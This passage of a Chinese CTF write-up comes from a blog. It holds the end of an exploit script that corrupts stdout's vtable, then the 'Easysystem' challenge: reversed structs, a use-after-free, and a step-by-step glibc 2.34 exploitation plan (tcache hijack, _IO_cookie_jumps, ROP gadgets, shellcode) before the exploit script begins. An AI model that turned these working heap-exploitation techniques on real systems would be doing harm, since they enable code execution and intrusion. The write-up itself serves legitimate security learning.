+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">dis</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">dis</span> <span class="o">&lt;</span> <span class="mh">0x7fffffff</span><span class="p">,</span> <span class="s2">&#34;try again&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span><span class="p">(</span><span class="n">dis</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">write_content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_content</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write sh;</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">stdout_addr</span> <span class="o">+</span> <span class="mi">132</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_content</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="s2">&#34;sh;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dis</span> <span class="o">=</span> <span class="n">target_addr</span>  <span class="o">-</span> <span class="n">string_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;current distance: </span><span class="si">{</span><span class="n">dis</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">dis</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">dis</span> <span class="o">&lt;</span> <span class="mh">0x7fffffff</span><span class="p">,</span> <span class="s2">&#34;try again&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span><span class="p">(</span><span class="n">dis</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">write_content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_content</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write stdout</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">stdout_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_content</span> <span class="o">=</span> <span class="mh">0x80</span>
+</span></span><span class="line"><span class="cl"><span class="n">dis</span> <span class="o">=</span> <span class="n">target_addr</span>  <span class="o">-</span> <span class="n">string_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;current distance: </span><span class="si">{</span><span class="n">dis</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">dis</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">dis</span> <span class="o">&lt;</span> <span class="mh">0x7fffffff</span><span class="p">,</span> <span class="s2">&#34;try again&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span><span class="p">(</span><span class="n">dis</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">write_content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_content</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">stdout_addr</span> <span class="o">+</span> <span class="mh">0xd8</span> <span class="c1"># vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_content</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_jump_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">56</span>
+</span></span><span class="line"><span class="cl"><span class="n">dis</span> <span class="o">=</span> <span class="n">target_addr</span>  <span class="o">-</span> <span class="n">string_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;current distance: </span><span class="si">{</span><span class="n">dis</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">dis</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">dis</span> <span class="o">&lt;</span> <span class="mh">0x7fffffff</span><span class="p">,</span> <span class="s2">&#34;try again&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span><span class="p">(</span><span class="n">dis</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">write_content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_content</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>布局成功后如下所示：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423225923925.png' alt="image-20220423225923925"></p>
+<p>此时修改<code>stdout-&gt;vtable</code>的低一个字节即可：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423230047709.png' alt="image-20220423230047709"></p>
+<p>远程打不动，弃疗了&hellip;</p>
+<h2 class="heading-element" id="3-easysystem"><span>3 Easysystem</span>
+  <a href="#3-easysystem" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这题需要耐心和时间去逆向以及利用。需要<code>IDA</code>文件的点<a href="https://image.roderickchan.cn/data/easysystem.zip"target="_blank" rel="external nofollow noopener noreferrer">这里<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>，我已经逆完了，我使用的<code>IDA</code>版本为<code>7.6</code>。需要调试镜像的使用<code>docker pull roderickchan/debug_pwn_env:21.10</code>拉取即可，已经安装好了<code>pwndbg/gef/pwncli</code>，使用<code>gdb-gef</code>和<code>gdb-pwndbg</code>命令切换插件。</p>
+<h3 class="heading-element" id="checksec-2"><span>Checksec</span>
+  <a href="#checksec-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425010422897.png' alt="image-20220425010422897"></p>
+<p>给的<code>libc</code>的版本很高，版本为<code>glibc-2.34</code>。移除了很多<code>hook</code>，基本上无法使用<code>hook</code>去控制程序执行流。</p>
+<p>噢对，还加了沙箱：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425014642939.png' alt="image-20220425014642939"></p>
+<h3 class="heading-element" id="漏洞点-2"><span>漏洞点</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>程序的逆向工作有点大，维护了好几个结构体，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">   This file has been generated by IDA.
+</span></span></span><span class="line"><span class="cl"><span class="cm">   It contains local type definitions from
+</span></span></span><span class="line"><span class="cl"><span class="cm">   the type library &#39;easysystem&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define __int8 char
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __int16 short
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __int32 int
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __int64 long long
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">User</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">FILE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* 15 */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">UserList</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">User</span> <span class="o">*</span><span class="n">user1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">User</span> <span class="o">*</span><span class="n">user2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* 16 */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">User</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">_1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">files</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">User</span> <span class="o">*</span><span class="n">next_user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* 17 */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">FILE</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">w</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">_1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">_2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">next_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* 18 */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">OpendFile</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">w</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">o_r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">o_w</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">o_x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">OpendFile</span> <span class="o">*</span><span class="n">next_open_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* 19 */</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">OpenFiles</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">OpendFile</span> <span class="o">*</span><span class="n">open_files1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">OpendFile</span> <span class="o">*</span><span class="n">open_files2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">max</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞点在<code>openfile</code>函数，全局变量未清理的漏洞：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425014256039.png' alt="image-20220425014256039"></p>
+<p>由于在<code>read_file/write_file</code>等函数均会使用到<code>open_file</code>这个全局变量，当其不为<code>null</code>的时候，会继续<code>read/write</code>。而如果在此之前调用<code>close_file</code>函数，则该变量指向的保存文件数据的内存是已经释放掉的内存：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220425014543466.png' alt="image-20220425014543466"></p>
+<p>基于该<code>use after free</code>的漏洞，可以劫持程序执行任意流程。</p>
+<h3 class="heading-element" id="利用思路-2"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>基于漏洞整理的利用思路如下：</p>
+<p><strong>step 1：任意地址写</strong></p>
+<ul>
+<li>首先<code>close_file</code>然后<code>write_file</code>，即可泄露出<code>libc</code>地址和<code>heap</code>地址</li>
+<li>然后再来一次，<code>close_file</code>之后<code>create_file</code>，然后<code>read_file</code>即可伪造上面整理的<code>FILE</code>结构体，修改其<code>next_file</code>字段和<code>length</code>字段，使其指向<code>tcache_perthread_struct</code></li>
+<li><code>delete_file</code>释放伪造的<code>file</code>即可释放掉<code>tcache_perthread_struct</code></li>
+<li>利用<code>tcache</code>让任意地址分配内存</li>
+</ul>
+<p><strong>step 2：劫持程序执行流</strong></p>
+<ul>
+<li>
+<p>分配到<code>stdout-&gt;vtable</code>上方，<code>tcache</code>里有检查，分配的地址需要<code>0x10</code>对齐</p>
+</li>
+<li>
+<p>修改<code>stdout-&gt;vtable</code>为<code>_IO_cookie_jumps+0x40</code></p>
+</li>
+<li>
+<p>布局好<code>__cookie</code>字段和<code>_IO_cookie_io_functions_t</code>结构体</p>
+</li>
+<li>
+<p>输入<code>exit\n</code>，然后输入一个不存在的用户名，即可调用<code>puts</code>，本来是调用<code>_IO_file_jumps-&gt;_IO_file_xsputn</code>，劫持后调用<code>(struct _IO_cookie_file *) stdout-&gt;__io_functions.write((struct _IO_cookie_file *) stdout-&gt;__cookie)</code>，这样就控制了<code>rip</code>和<code>rdi</code></p>
+</li>
+<li>
+<p>用两段<code>gadget</code>劫持<code>rsp</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000165fa0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+</span></span><span class="line"><span class="cl">0x0000000000059fa0: mov rsp, rdx; ret;</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>然后<code>rop</code>修改<code>heap</code>的执行权限，执行提前布局好的<code>shellcode</code></p>
+</li>
+<li>
+<p>利用<code>retfq</code>切换到<code>32</code>位执行<code>orw</code>读取<code>flag</code></p>
+</li>
+</ul>
+<h3 class="heading-element" id="exp-2"><span>EXP</span>
+  <a href="#exp-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
